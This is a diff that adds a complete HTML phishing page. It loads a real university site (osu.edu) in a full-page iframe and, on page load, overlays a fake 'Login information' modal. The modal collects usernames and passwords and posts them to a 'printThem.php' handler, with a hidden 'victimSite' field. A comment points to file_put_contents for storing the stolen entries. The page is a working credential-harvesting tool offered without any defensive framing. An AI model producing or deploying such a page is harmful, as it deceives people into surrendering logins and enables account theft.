@@ -1,0 +1,15 @@
+
+
+<html>
+
+
+
+<link rel="stylesheet" href="https://netdna.bootstrapcdn.com/bootstrap/3.0.3/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://netdna.bootstrapcdn.com/bootstrap/3.0.3/css/bootstrap-theme.min.css">
+<script src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
+<script src="https://netdna.bootstrapcdn.com/bootstrap/3.0.3/js/bootstrap.min.js"></script>
+
+<body onLoad="$('#my-modal').modal('show');">
+
+<form action="printThem.php" method="post"><input type="hidden" name="victimSite" value="https://www.osu.edu">
+       <div id="my-modal" class="modal fade">       <div class="modal-dialog">       <div class="modal-content">            <div class="modal-header">            <div>              </div>              <h4 class="modal-title">Login information</h4>               </div>           <div class="modal-body">              <label for="usrnm" class="ui-hidden-accessible">Username:</label>                   <input type="text" name="user" id="usrnm" placeholder="Username">              <label for="pswd" class="ui-hidden-accessible">Password:</label>                   <input type="password" name="passw" id="pswd" placeholder="Password">                     <label for="log">Keep me logged in</label>                    <input type="checkbox" name="login" id="log" value="1" data-mini="true">                    <input type="submit" data-inline="true" value="Log in">          </div>      </div>    </div>  </div> </form><!-- int file_put_contents ( string text.txt , mixed name [, int $flags = 0 [, resource $context ]] ) --><iframe src="https://www.osu.edu" style="border: 0; width: 100%; height: 100%">Your browser doesn't support iFrames.</iframe></body></html>
